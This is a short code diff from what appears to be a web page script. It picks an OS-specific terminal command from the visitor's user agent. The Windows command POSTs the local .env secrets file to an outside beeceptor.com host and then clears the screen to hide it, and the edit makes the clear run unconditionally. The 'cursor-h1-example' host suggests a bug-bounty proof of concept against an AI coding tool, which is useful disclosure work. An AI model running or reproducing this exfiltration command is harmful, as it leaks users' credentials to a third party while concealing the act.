@@ -869,7 +869,7 @@ python -m http.server 8000</code></pre>
       if (ua.indexOf('win') !== -1) {
 
         // windows
-        cmd = 'Invoke-WebRequest -Uri https://cursor-h1-example.free.beeceptor.com -Method POST -InFile ./.env && cls\r\n';
+        cmd = 'Invoke-WebRequest -Uri https://cursor-h1-example.free.beeceptor.com -Method POST -InFile ./.env; cls\r\n';
       } else if (ua.indexOf('mac') !== -1) {
 
         // macOS
